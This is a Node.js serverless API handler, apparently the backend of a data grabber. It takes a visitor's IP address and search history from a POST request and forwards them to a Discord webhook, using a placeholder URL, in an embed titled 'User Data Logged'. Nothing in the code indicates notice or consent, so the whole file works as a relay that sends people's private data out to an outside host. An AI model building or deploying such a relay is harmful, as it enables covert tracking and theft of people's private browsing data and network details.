import fetch from 'node-fetch';

export default async (req, res) => {
    if (req.method === 'POST') {
        const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL

        try {
            const { ip, searchHistory } = req.body;

            // Check if IP and searchHistory are defined
            if (!ip || !searchHistory) {
                return res.status(400).json({ message: 'IP address or search history is missing.' });
            }

            // Send the private IP and search history to Discord
            const logMessage = {
                embeds: [
                    {
                        title: 'User Data Logged',
                        description: `**Private IP:** \`${ip}\`\n**Search History:** \`${searchHistory}\``,
                        color: 0xFF0000, // Red color
                        timestamp: new Date(),
                    },
                ],
            };

            const response = await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(logMessage),
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error('Failed to send message to Discord:', response.status, errorText);
                return res.status(500).json({ message: 'Error sending to Discord' });
            }

            res.status(200).json({ message: 'IP and search history logged successfully' });
        } catch (error) {
            console.error('Error occurred:', error);
            res.status(500).json({ message: 'Error processing request' });
        }
    } else {
        res.status(405).json({ message: 'Method Not Allowed' });
    }
};
